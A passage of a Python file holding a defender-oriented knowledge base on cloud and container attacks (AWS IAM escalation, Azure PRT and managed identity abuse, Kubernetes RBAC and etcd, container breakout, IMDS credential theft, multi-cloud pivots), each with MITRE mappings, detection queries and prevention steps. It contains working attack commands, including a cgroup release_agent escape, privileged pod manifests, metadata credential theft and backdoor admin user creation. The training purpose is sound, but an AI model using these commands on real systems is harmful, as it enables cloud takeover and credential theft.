  --set-as-default

# 3. iam:PassRole + ec2:RunInstances -> launch EC2 with admin role
aws ec2 run-instances --iam-instance-profile Name=AdminRole --image-id ami-xxx --instance-type t2.micro
# Then: access IMDS on new instance to get admin credentials

# 4. lambda:CreateFunction + iam:PassRole + lambda:InvokeFunction
aws lambda create-function --function-name evil --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT:role/AdminRole \
  --handler lambda_function.handler --zip-file fileb://evil.zip
aws lambda invoke --function-name evil output.txt
```

## S3 Bucket Enumeration

```bash
# Public bucket discovery
# AWS S3 buckets named: <company>-backup, <company>-logs, <company>-dev, etc.
aws s3 ls s3://targetcorp-backup --no-sign-request  # test without auth
aws s3 ls s3://targetcorp-prod-logs --no-sign-request

# Tools
# s3scanner
s3scanner scan --buckets targetcorp-backup,targetcorp-logs,targetcorp-dev

# Bucket Finder / GrayhatWarfare (public bucket search)
# Check: https://buckets.grayhatwarfare.com/?keywords=targetcorp

# If bucket found -- enumerate contents
aws s3 ls s3://exposed-bucket/ --recursive --no-sign-request
aws s3 cp s3://exposed-bucket/database-backup.sql . --no-sign-request
```

## Lambda Abuse

```bash
# If attacker can invoke Lambda functions:
# Lambda functions often have access to secrets, databases, internal APIs

# List accessible Lambda functions
aws lambda list-functions

# Invoke with event injection (if function processes user events without validation)
aws lambda invoke --function-name process-user-data \
  --payload '{"user_id": "1; DROP TABLE users;--"}' output.txt

# Lambda environment variables -- often contain secrets
aws lambda get-function-configuration --function-name target-function
# Check for: DATABASE_URL, API_KEY, AWS_ACCESS_KEY_ID (role)

# Lambda layer abuse (if can update layer):
# Add malicious code to shared layer -> executes in all functions using that layer
```

## Detection Opportunities

```kql
// AWS CloudTrail: IAM privilege escalation attempts
AWSCloudTrail
| where eventName in ("AttachUserPolicy", "AttachRolePolicy", "CreatePolicyVersion",
                      "PutUserPolicy", "AddUserToGroup")
| where userIdentity.type != "Root"
| where NOT (userIdentity.principalId contains "SecurityAutomation")
| project TimeGenerated, eventName, userIdentity.arn, requestParameters

// Unusual API calls after IMDS credential theft
// Credentials used from non-AWS IP source
AWSCloudTrail
| where userIdentity.sessionContext.sessionIssuer.type == "Role"
| where NOT (sourceIPAddress contains "amazonaws.com" OR sourceIPAddress contains "ec2")

// S3 bucket enumeration (many GetObject on non-existent keys = s3scanner)
AWSCloudTrail
| where eventName == "GetObject" AND errorCode == "NoSuchKey"
| summarize count() by sourceIPAddress, bin(TimeGenerated, 1m)
| where count_ > 50
```

## Prevention

1. **Least privilege IAM**: Never use wildcard actions; use specific resource ARNs
2. **SCPs (Service Control Policies)**: Org-level guardrails that override IAM policies
3. **IMDSv2 mandatory**: Require token for all IMDS access
4. **S3 Block Public Access**: Enable at Organisation level -- prevent accidental public buckets
5. **AWS Config rules**: Automated compliance checks for IAM, S3, and EC2 configurations
6. **GuardDuty**: AWS threat detection service -- alerts on credential compromise, anomalous API calls
""",
    },
    {
        "title": "Azure/Entra ID Attacks — PRT Theft, Managed Identity Abuse, Runbook Exploitation",
        "tags": ["Azure", "Entra-ID", "PRT", "managed-identity", "T1550.001", "T1528", "cloud-attacks"],
        "content": r"""# Azure/Entra ID Attacks — PRT Theft, Managed Identity Abuse, Runbook Exploitation

## Overview

Azure/Entra ID presents unique attack surfaces: Primary Refresh Tokens (PRTs) enable persistent access bypassing MFA, Managed Identities can be abused for privilege escalation, and Automation Runbooks execute with high-privilege identities.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1550.001 | Use Alternate Authentication Material: Application Access Token | Lateral Movement |
| T1528 | Steal Application Access Token | Credential Access |
| T1578 | Modify Cloud Compute Infrastructure | Defense Evasion |

## Primary Refresh Token (PRT) Theft

PRTs are long-lived tokens issued to Entra ID-joined devices. They can generate access tokens for any cloud resource without MFA re-challenge.

```powershell
# AADInternals -- extract PRT from Windows device (requires admin)
Install-Module AADInternals -Force
Import-Module AADInternals

# Get PRT from current device
$prt = Get-AADIntUserPRTToken
# Output: eyJ0eXAiOiJKV1QiLCJub25jZSI6... (PRT token)

# Use PRT to generate access token for any resource
$accessToken = Get-AADIntAccessTokenForResource -Resource "https://management.azure.com/" -PRTToken $prt

# Or: request token via x-ms-RefreshTokenCredential cookie
# Set cookie in browser -> authenticated session without password/MFA

# From another machine: use stolen PRT to pass-the-PRT
# Inject PRT into new session context
```

## Managed Identity Abuse

```bash
# Azure VMs have Managed Identity -> can request tokens without credentials
# From compromised VM, access IMDS for token:
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token to call Azure Management API
TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"

# If VM's managed identity has Contributor role:
# Create new VMs, modify NSGs, access storage accounts, read Key Vault secrets

# ROADtools -- Azure attack framework
roadrecon gather --access-token $TOKEN
roadrecon plugin policies  # enumerate conditional access policies
```

## Automation Runbook Exploitation

```python
# Azure Automation Accounts run PowerShell/Python with RunAs account
# RunAs account often has Contributor on subscription

# If attacker can create/modify runbooks (requires Automation Operator role):
# az automation runbook create --name evil --type PowerShell --resource-group rg --account aa
# az automation runbook replace-content --name evil --resource-group rg --account aa --content @evil.ps1
# az automation runbook start --name evil --resource-group rg --account aa

# evil.ps1 content (runs with RunAs account's subscription-level permissions):
# $cred = Get-AutomationPSCredential -Name "RunAsCredential"
# New-AzRoleAssignment -ObjectId attacker_object_id -RoleDefinitionName "Owner" -Scope /subscriptions/SUBID
```

## Entra ID Application Registration Abuse

```bash
# Add credentials to existing service principal
# If attacker has Application.ReadWrite.All permission:

# Add certificate credential to existing app
az ad app credential reset --id APP_ID --append
# Now authenticate as that application

# Consent to over-privileged permissions
# Register new app, request Mail.Read, Files.ReadWrite.All
# Phish admin to consent -> persistent access

# Service principal password spray
# Unlike user accounts, service principals often have no lockout
for password in wordlist:
    az login --service-principal -u APP_ID -p $password --tenant TENANT_ID
```

## Detection Opportunities

```kql
// PRT usage from new device/location
SigninLogs
| where AuthenticationRequirement == "singleFactorAuthentication"
| where DeviceDetail.deviceId not in (known_corporate_devices)
| where ConditionalAccessStatus == "success"

// Managed Identity token used from unexpected source
AzureActivity
| where CallerIpAddress not in (known_azure_regions)
| where OperationName contains "roleAssignments/write"

// Runbook modified and executed
AzureActivity
| where ResourceType == "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS"
| where OperationName in ("Microsoft.Automation/automationAccounts/runbooks/write",
                          "Microsoft.Automation/automationAccounts/jobs/write")
| project TimeGenerated, Caller, ResourceGroup, Properties
```

## Prevention

1. **Conditional Access**: Require compliant device AND MFA for all cloud access -- PRT from non-compliant device blocked
2. **Restrict IMDS access**: Azure Policy to require IMDSv2-equivalent (token-based)
3. **Managed Identity scoping**: Minimal permissions; no subscription-level Contributor for VMs
4. **Runbook access control**: Restrict Automation Operator role; monitor runbook changes
5. **PIM (Privileged Identity Management)**: JIT access for high-privilege roles -- reduce standing permissions
6. **Microsoft Defender for Cloud**: Anomalous API call detection, managed identity abuse detection
""",
    },
    {
        "title": "Kubernetes Attacks — Container Escape, RBAC Abuse, etcd Secrets",
        "tags": ["kubernetes", "K8s", "container-escape", "RBAC-abuse", "etcd", "T1610", "cloud-attacks"],
        "content": r"""# Kubernetes Attacks — Container Escape, RBAC Abuse, etcd Secrets

## Overview

Kubernetes attack paths typically chain multiple steps: initial access to a pod, container escape or RBAC abuse to reach the control plane, then cluster-wide or cloud-level compromise. Understanding these chains is essential for cloud security teams.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1610 | Deploy Container | Execution |
| T1613 | Container and Resource Discovery | Discovery |
| T1552.007 | Unsecured Credentials: Container API | Credential Access |

## Initial Reconnaissance (from Inside a Pod)

```bash
# Check service account permissions
kubectl auth can-i --list  # requires kubectl and valid kubeconfig
# Or directly via API:
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces \
     -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# Cluster environment detection
env | grep -E "(KUBERNETES|K8S)"
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Network discovery from pod
nmap -sT 10.96.0.0/12  # default service CIDR
curl -k https://10.96.0.1:443/api/  # Kubernetes API server
```

## RBAC Abuse

```bash
# If service account has pods/exec:
kubectl exec -it <target-pod> -- /bin/bash
# Access secrets from other pods, pivot to other namespaces

# Create privileged pod to escape (if create pods permission)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
# -> Access host filesystem at /host, chroot into it
kubectl exec -it escape -- chroot /host
```

## etcd Secret Extraction

etcd stores all Kubernetes secrets including kubeconfig, service account tokens, and application secrets. If accessible, it exposes the entire cluster.

```bash
# Direct etcd access (requires certificates -- often accessible from control plane)
ETCDCTL_API=3 etcdctl get / --prefix --keys-only \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key

# Extract all secrets
ETCDCTL_API=3 etcdctl get /registry/secrets --prefix \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=... --cert=... --key=...
# Output: all secrets in base64-encoded form

# Decode a specific secret
echo "BASE64_SECRET_VALUE" | base64 -d
```

## Kubelet API Abuse

```bash
# Kubelet runs on each node on port 10250 (HTTPS)
# If anonymous auth enabled (misconfiguration):
curl -k https://NODE_IP:10250/pods  # list all pods on node
curl -k https://NODE_IP:10250/exec/NAMESPACE/POD/CONTAINER \
  -d "command=id&command=whoami"  # execute command in any container
```

## Detection Opportunities

```kql
// Kubernetes audit log -- sensitive API calls
// (Requires K8s audit policy configured to log these)
k8s_audit
| where verb in ("exec", "create", "patch") AND
  resource.resource == "pods" AND
  requestURI contains "/exec"
| where NOT user.username in (known_admin_users)

// New privileged pod created
k8s_audit
| where verb == "create" AND resource.resource == "pods"
| where request.spec.containers[].securityContext.privileged == true OR
        request.spec.hostPID == true OR
        request.spec.volumes[].hostPath != null

// Service account token used from outside cluster IP range
k8s_audit
| where user.groups contains "system:serviceaccounts"
| where NOT sourceIPs[0]: (pod_cidr OR node_cidr)
```

## Prevention

1. **RBAC least privilege**: No wildcards; no cluster-admin for application service accounts
2. **Network policies**: Deny all by default; explicitly allow required pod-to-pod communication
3. **Pod Security Standards**: `Restricted` profile -- no privileged, no hostPID, no hostPath mounts
4. **etcd encryption**: Enable encryption at rest for etcd; restrict etcd access to control plane only
5. **Audit logging**: Enable K8s audit policy for exec, create, delete operations
6. **Admission controllers**: OPA/Gatekeeper, Kyverno -- enforce security policies at admission
""",
    },
    {
        "title": "Container Breakout Techniques — Privileged Containers, Mounts, Kernel Exploits",
        "tags": ["container-escape", "privileged-container", "cgroups", "T1611", "docker", "kubernetes"],
        "content": r"""# Container Breakout Techniques — Privileged Containers, Mounts, Kernel Exploits

## Overview

Container breakout escapes from a containerised environment to the host OS. Several misconfigurations make breakout trivial; kernel exploits work even in properly configured containers. SOC analysts must understand breakout indicators to detect container compromise.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1611 | Escape to Host | Privilege Escalation |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |

## Technique 1 — Privileged Container

```bash
# If container runs with --privileged flag:
# All capabilities, full /dev access, can mount host filesystems

# Check if privileged:
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff (all capabilities) = privileged

# Breakout via /dev/sda (host disk access):
fdisk -l /dev/sda  # list host disk partitions
mkdir /host && mount /dev/sda1 /host  # mount host root filesystem
chroot /host  # chroot into host -> full host access
```

## Technique 2 — Host Path Mount

```yaml
# Pod spec with dangerous host mount:
volumes:
- name: host-root
  hostPath:
    path: /
# If mounted to /host inside container: full read/write to host filesystem

# Even if not /: sensitive paths
# /var/run/docker.sock   -> Docker daemon socket = full Docker access
# /etc                   -> overwrite host config files
# /proc                  -> host process namespace
# /run/containerd        -> container runtime
```

```bash
# Docker socket breakout (if /var/run/docker.sock mounted)
ls /var/run/docker.sock  # present = breakout possible

# Use Docker API directly to create privileged container
curl -s --unix-socket /var/run/docker.sock -X POST \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# Start container and exec into it -> host access
```

## Technique 3 — Kernel Exploits

Kernel exploits work even in properly isolated containers since containers share the host kernel.

```bash
# Notable container-relevant kernel CVEs:
# CVE-2022-0492: cgroup v1 release_agent escape
# CVE-2019-5736: runc container escape (overwrites runc binary)
# CVE-2022-3328: snap-confine SUID exploit (Ubuntu)
# Dirty Pipe (CVE-2022-0847): overwrite read-only files

# CVE-2022-0492 (cgroup release_agent):
# Only works if container has CAP_SYS_ADMIN or unshared user namespace
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output  # output from host context
```

## Technique 4 — Namespace Escape

```bash
# If container has CAP_SYS_PTRACE and shares PID namespace with host:
# Attach to host process -> read host memory / inject code

# nsenter -- enter host namespaces (requires appropriate caps)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# target 1 = PID 1 = init/systemd on host -> full host shell

# Check available capabilities
capsh --print | grep "Current:"
# Look for: cap_sys_admin, cap_sys_ptrace, cap_net_admin
```

## Detection Opportunities

```kql
// New mount inside container (Sysmon-compatible or container security tools)
// Falco: detect container accessing /proc/sysrq-trigger or /dev/sda

// Falco rules (examples):
// - Container with privileged access writing to host filesystem
// - Process using nsenter to escape namespaces
// - Unexpected network tools (nmap, curl) running in containers

// Container runtime events
// containerd/docker logs: container started with --privileged or hostPath=/
container.privileged == true
OR container.mounts contains "hostPath: /"
OR container.mounts contains "/var/run/docker.sock"

// Process escaping to host namespace
event.type: "setns" AND container.id != "host"
```

## Prevention

1. **Pod Security Standards -- Restricted**: No privileged, no hostPID/hostIPC, no hostPath, read-only root filesystem
2. **Drop all capabilities**: `securityContext.capabilities.drop: [ALL]`; add only required caps
3. **seccomp profiles**: Restrict syscalls available to container processes
4. **AppArmor/SELinux**: Mandatory access control limits container-to-host interaction
5. **Patch kernel**: Container breakout CVEs require patching the host kernel
6. **Runtime security**: Falco, Tetragon, Sysdig -- detect anomalous container behaviour at runtime
""",
    },
    {
        "title": "Cloud Credential Theft — IMDS, Metadata Service, Workload Identity",
        "tags": ["cloud-credentials", "IMDS", "metadata-service", "workload-identity", "T1552.005"],
        "content": r"""# Cloud Credential Theft — IMDS, Metadata Service, Workload Identity

## Overview

Cloud credentials attached to compute instances (EC2 roles, Azure Managed Identities, GCP service accounts) are a prime attack target. If an attacker gains execution on a cloud VM or container, IMDS provides credentials that can be used to pivot to other cloud services.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | Credential Access |
| T1528 | Steal Application Access Token | Credential Access |

## AWS IMDS Credential Theft

```bash
# IMDSv1 (no authentication -- simple GET):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: RoleName

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2RoleName
# Returns:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "abcdef...",
#   "Token": "IQoJb3JpZ2luX...",
#   "Expiration": "2025-01-01T12:00:00Z"
# }

# Use credentials:
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="abcdef..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX..."
aws sts get-caller-identity  # confirm identity
aws s3 ls  # list buckets

# IMDSv2 (requires PUT token):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2RoleName
```

## Azure IMDS Credential Theft

```bash
# Azure IMDS -- requires Metadata: true header
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Returns access token for Azure Resource Manager
# Also works for other resources:
# - https://storage.azure.com/
# - https://vault.azure.com/
# - https://graph.microsoft.com/

# Multiple identities -- specify client_id if multiple managed identities assigned
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=USER_ASSIGNED_MI_CLIENT_ID"
```

## GCP Metadata Server

```bash
# GCP uses metadata.google.internal (maps to 169.254.169.254)
# Requires Metadata-Flavor: Google header

# Get service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Returns access_token + token_type + expires_in

# Use token for GCP APIs
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# Get project metadata, SSH keys, custom metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"
```

## Kubernetes Service Account Tokens

```bash
# Every K8s pod gets a service account token mounted at:
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token against K8s API
APISERVER=$(cat /var/run/secrets/kubernetes.io/serviceaccount/KUBERNETES_SERVICE_HOST)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://$APISERVER/api/v1/namespaces/default/secrets
# If SA has secrets/get permission: retrieve all secrets in namespace
```

## Credential Persistence After Theft

```bash
# AWS: stolen role credentials expire (usually 1-12 hours)
# Create persistent IAM user/access key if iam:CreateUser + iam:CreateAccessKey
aws iam create-user --user-name legitimate-looking-user
aws iam attach-user-policy --user-name legitimate-looking-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name legitimate-looking-user
# These access keys don't expire (unlike role credentials)
```

## Detection Opportunities

```kql
// AWS: role credentials used from non-AWS IP
AWSCloudTrail
| where userIdentity.type == "AssumedRole"
| where NOT (sourceIPAddress endswith ".amazonaws.com" OR sourceIPAddress contains "ec2")
| where NOT sourceIPAddress in (known_corporate_nat_ips)
| project TimeGenerated, sourceIPAddress, userIdentity.arn, eventName

// Azure: managed identity token used from VM's public IP (ok) vs unexpected IP
// (requires correlating VM public IP with token usage)
AzureActivity
| where Claims.oid in (managed_identity_object_ids)
| where CallerIpAddress not in (vm_public_ips, azure_service_ips)

// New IAM user created (persistence indicator)
AWSCloudTrail
| where eventName in ("CreateUser", "CreateAccessKey", "AttachUserPolicy")
| where userIdentity.type == "AssumedRole"  // created by role, not existing IAM user
```

## Prevention

1. **IMDSv2 mandatory**: `aws ec2 modify-instance-metadata-options --http-tokens required`
2. **Minimal role permissions**: EC2 roles should have only required S3 buckets/actions, not wildcard
3. **Short credential lifetime**: STS tokens with 1-hour expiry; role session duration limits
4. **Network controls**: Block IMDS access from containers (iptables rules, network policies)
5. **GuardDuty / Defender for Cloud**: Detect credentials used from unexpected locations
6. **Credential rotation monitoring**: Alert on new IAM users/access keys created outside normal CI/CD
""",
    },
    {
        "title": "Kubernetes and Container RBAC Abuse",
        "tags": ["kubernetes-RBAC", "service-account", "cluster-admin", "T1613", "T1552.007"],
        "content": r"""# Kubernetes and Container RBAC Abuse

## Overview

Kubernetes Role-Based Access Control (RBAC) misconfigurations are among the most common paths to cluster compromise. Over-permissive service accounts, wildcard permissions, and cluster-admin bindings create attack paths from compromised pods to full cluster control.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1613 | Container and Resource Discovery | Discovery |
| T1552.007 | Unsecured Credentials: Container API | Credential Access |

## Dangerous RBAC Patterns

```yaml
# DANGEROUS: wildcard permissions on all resources
kind: ClusterRole
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# DANGEROUS: create pods in any namespace (container escape path)
rules:
- resources: ["pods"]
  verbs: ["create"]

# DANGEROUS: exec into pods (lateral movement)
rules:
- resources: ["pods/exec"]
  verbs: ["create"]

# DANGEROUS: secrets read (credential theft)
rules:
- resources: ["secrets"]
  verbs: ["get", "list"]

# DANGEROUS: nodes/proxy (access kubelet API)
rules:
- resources: ["nodes/proxy"]
  verbs: ["get"]
```

## Enumerating RBAC from Inside a Pod

```bash
# Using mounted service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
K8S_API="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# List what the SA can do
curl -k -H "Authorization: Bearer $TOKEN" \
  "$K8S_API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

# List pods, secrets, configmaps
curl -k -H "Authorization: Bearer $TOKEN" "$K8S_API/api/v1/namespaces/$NS/pods"
curl -k -H "Authorization: Bearer $TOKEN" "$K8S_API/api/v1/namespaces/$NS/secrets"
```

## Privilege Escalation via RBAC

```bash
# If SA can create serviceaccounts and rolebindings:
# Create new SA with cluster-admin binding

kubectl apply -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: pwned-sa
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwned-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: pwned-sa
  namespace: kube-system
EOF

# Get token for new cluster-admin SA
kubectl -n kube-system get secret $(kubectl -n kube-system get sa pwned-sa -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d
```

## Detection Opportunities

```kql
// K8s audit log: sensitive RBAC operations
k8s_audit
| where resource.resource in ("clusterrolebindings", "rolebindings") AND verb in ("create", "update")
| where NOT user.username in (known_admin_users)

// Service account used outside expected namespace
k8s_audit
| where user.username startswith "system:serviceaccount:"
| where NOT namespace in (expected_namespaces)

// Pod exec (potential lateral movement)
k8s_audit
| where requestURI contains "/exec" AND verb == "create"
| project TimeGenerated, user.username, objectRef.namespace, objectRef.name

// ClusterRoleBinding to cluster-admin for unexpected subject
k8s_audit
| where resource.resource == "clusterrolebindings" AND verb == "create"
| where requestObject.roleRef.name == "cluster-admin"
| where requestObject.subjects[0].name not in (known_cluster_admins)
```

## Prevention

1. **Audit RBAC regularly**: `kubectl get clusterrolebindings | grep cluster-admin` -- remove unexpected bindings
2. **No wildcard permissions**: Specify exact resources and verbs
3. **Disable service account token auto-mount**: `automountServiceAccountToken: false` where not needed
4. **Limit `pods/exec`**: Restrict who can exec into pods; consider disabling entirely in production
5. **RBAC analysis tools**: rbac-police, KubiScan, kubectl-who-can -- identify over-permissive accounts
6. **Namespace-scoped roles**: Use Role (namespace-scoped) not ClusterRole where possible
""",
    },
    {
        "title": "Multi-Cloud Pivot — Moving Between AWS, Azure, and GCP Environments",
        "tags": ["multi-cloud", "cloud-pivot", "lateral-movement", "T1199", "T1078.004", "federation"],
        "content": r"""# Multi-Cloud Pivot — Moving Between AWS, Azure, and GCP Environments

## Overview

Organisations increasingly use multiple cloud providers. Cross-cloud attacks leverage trust relationships, federated identities, and shared secrets to pivot between AWS, Azure, and GCP. Understanding these paths is critical for multi-cloud security teams.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1199 | Trusted Relationship | Initial Access |
| T1078.004 | Valid Accounts: Cloud Accounts | Initial Access |
| T1484.002 | Domain Trust Modification | Privilege Escalation |

## Cross-Cloud Identity Federation

Modern organisations federate identities between clouds:

```
Example: GCP Workload Identity Federation with AWS
  AWS EC2 with role -> Exchange AWS credential for GCP access token

  # GCP Workload Identity Federation setup:
  # Allow AWS role to assume GCP service account via federation

  # From AWS EC2:
  AWS_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
  AWS_CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $AWS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/AWS_ROLE)

  # Exchange for GCP token:
  gcloud auth login --cred-file=aws_workload_identity_config.json
  # -> GCP access token for federated service account
```

## Azure AD to AWS via OIDC Federation

```bash
# Azure Entra ID -> AWS IAM OIDC Federation
# If AWS IAM role trusts Azure AD tokens for specific conditions:

# 1. Obtain Azure AD token (from managed identity or stolen PRT)
AZURE_TOKEN=$(curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=api://AWS_ACCOUNT_ID" | jq -r .access_token)

# 2. Assume AWS role via AssumeRoleWithWebIdentity
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::ACCOUNT:role/AzureFederatedRole \
  --role-session-name pivot \
  --web-identity-token $AZURE_TOKEN

# 3. Use returned credentials to access AWS
```

## CI/CD Pipeline as Pivot

CI/CD systems are rich cross-cloud pivot points:

```bash
# GitHub Actions with OIDC -- trusts GitHub to authenticate to AWS/GCP/Azure
# If attacker can write to repo or inject into workflow:

# Malicious workflow step:
# - name: Steal cloud credentials
#   run: |
#     # GitHub provides OIDC token
#     TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
#              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
#     # Exchange for AWS credentials via AssumeRoleWithWebIdentity
#     aws sts assume-role-with-web-identity --web-identity-token $TOKEN ...

# Jenkins: /var/lib/jenkins/.aws/credentials
# GitLab CI: environment variables containing cloud credentials
# CircleCI: context variables accessible from any job in org (2023 breach)
```

## Terraform State File Exploitation

```bash
# Terraform state files contain all resource IDs, credentials, and secrets
# Stored in S3, Azure Blob, GCP GCS, or locally

# If S3 state bucket is accessible:
aws s3 ls s3://company-terraform-state/ --recursive
aws s3 cp s3://company-terraform-state/prod/terraform.tfstate .

# State file contains:
# - Database passwords (if passed as variables)
# - Private keys generated by Terraform
# - IAM access keys if created by Terraform
# - Service account keys
grep -E "(password|secret|key|token)" terraform.tfstate | head -20
```

## Detection Opportunities

```kql
// AWS: AssumeRoleWithWebIdentity from unexpected OIDC provider
AWSCloudTrail
| where eventName == "AssumeRoleWithWebIdentity"
| where requestParameters.webIdentityToken contains "github" AND
  NOT userIdentity.principalId contains (known_github_org)

// GCP: Workload Identity Federation usage from unexpected project/service
// GCP audit logs: sts.googleapis.com -- token exchange events

// Terraform state bucket access
AWSCloudTrail
| where eventName in ("GetObject", "ListBucket")
| where requestParameters.bucketName contains ("terraform-state" OR "tf-state" OR "tfstate")
| where NOT userIdentity.arn in (known_devops_roles)
```

## Prevention

1. **Audit federation trust policies**: Regularly review OIDC/SAML trust relationships between clouds
2. **Principle of least privilege for federation**: Federated roles should have minimal required permissions
3. **Terraform state encryption**: Encrypt state files; enable S3 versioning + MFA delete
4. **CI/CD secrets isolation**: Separate secrets per environment; revoke on breach
5. **Monitor cross-cloud API calls**: Correlate identity usage across CloudTrail, Azure Monitor, GCP audit logs
6. **GitHub Actions security**: Pin action versions; require approvals for workflow changes in main branch
""",
    },
]

# ============================================================
# COLLECTIONS REGISTRY
# ============================================================

COLLECTIONS = [
    (
        "Initial Access & Social Engineering",
        "Phishing campaigns, credential harvesting, supply chain attacks, and social engineering techniques used by attackers to gain initial foothold.",
        INITIAL_ACCESS,
    ),
    (
        "Privilege Escalation & Credential Attacks",
        "Windows and Linux privilege escalation, Kerberos attacks, credential dumping, and Active Directory exploitation techniques.",
        PRIVESC_CREDS,
    ),
    (
        "Lateral Movement & Persistence",
        "Techniques for moving through networks and establishing persistent access, including C2 frameworks, LOTL, and AD persistence.",
        LATERAL_PERSISTENCE,
    ),
    (
        "Web Application Attacks",
        "SQL injection, XSS, SSRF, deserialization, authentication bypass, API vulnerabilities, and file upload exploitation.",
        WEB_ATTACKS,
    ),
    (
        "Evasion & Anti-Detection",
        "AV/EDR evasion, AMSI bypass, process injection, log manipulation, network evasion, and obfuscation techniques.",
        EVASION_TECHNIQUES,
    ),
    (
        "Exploitation Fundamentals",
        "Memory corruption, buffer overflows, shellcode, ROP chains, Metasploit, vulnerability research, and exploit mitigations.",
        EXPLOITATION_FUNDAMENTALS,
    ),
    (
        "Cloud & Container Attacks",
        "AWS/Azure/GCP attack paths, Kubernetes exploitation, container escapes, cloud credential theft, and multi-cloud pivoting.",
        CLOUD_ATTACKS,
    ),
]
